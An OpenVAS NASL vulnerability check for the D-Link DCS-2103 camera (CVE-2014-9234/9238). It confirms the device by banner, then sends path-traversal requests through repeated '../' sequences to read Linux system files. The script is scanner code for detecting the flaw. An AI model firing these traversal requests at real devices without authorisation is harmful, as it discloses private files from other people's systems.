###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_ipcomera_mult_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# D-link IP Camera DCS-2103 Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805031");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2014-9234", "CVE-2014-9238");
  script_bugtraq_id(71484);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2014-12-15 14:54:29 +0530 (Mon, 15 Dec 2014)");
  script_name("D-link IP Camera DCS-2103 Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host has D-link IP Camera and is
  prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is able to download the system files.");

  script_tag(name:"insight", value:"Flaws are due to,
  - The /cgi-bin/sddownload.cgi script not properly sanitizing user input,
    specifically path traversal style attacks (e.g. '../') supplied via
    the 'file' parameter.
  - An input passed via the /cgi-bin/sddownload.cgi script to the 'file'
    parameter is not properly sanitized.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to disclose the software's installation path resulting in a loss
  of confidentiality and gain access to arbitrary files.

  Impact Level: Application");

  script_tag(name:"affected", value:"D-link IP camera DCS-2103 with firmware 1.0.0");

  script_tag(name:"solution", value:"Upgrade to D-link IP camera DCS-2103 with
  firmware after 1.0.0
  For updates refer to http://www.dlink.com");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129138");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Nov/42");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("DCS-2103/banner");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
DlinkBanner = "";
DlinkPort = "";
DlinkReq = "";
DlinkRes = "";
files = "";

## Get HTTP Port
DlinkPort = get_http_port(default:80);

## Confirm the device from banner
DlinkBanner = get_http_banner(port: DlinkPort);
if('WWW-Authenticate: Basic realm="DCS-2103"' >!< DlinkBanner) exit(0);

## affected only on linux
files = traversal_files("linux");

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = "/" + crap(data:"../",length:15) + files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:DlinkPort, url:url, pattern:file))
  {
    report = report_vuln_url( port:DlinkPort, url:url );
    security_message(port:DlinkPort, data:report);
    exit(0);
  }
}

exit(99);
